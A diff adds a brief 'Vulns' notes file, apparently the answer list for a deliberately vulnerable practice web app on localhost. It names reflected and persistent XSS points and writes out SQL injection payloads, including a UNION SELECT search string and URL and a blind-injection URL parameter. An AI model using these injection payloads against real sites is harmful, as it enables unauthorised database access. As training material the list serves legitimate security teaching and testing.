@@ -1,0 +1,15 @@
+Vulns
+-----
+
+Reflective XSS
+Order name
+
+Persistent XSS
+Product name and description
+
+SQL injection
+Search: ') UNION SELECT 0, 'Product SQLi', 'bla', 0 -- 
+http://localhost:4567/search?query='%29%20UNION%20SELECT%200,%20'Product SQLi',%20'bla',%200%20--%20
+
+Blind SQL injection
+http://localhost:4567/product?id[]=0%29%20OR%20%281=1
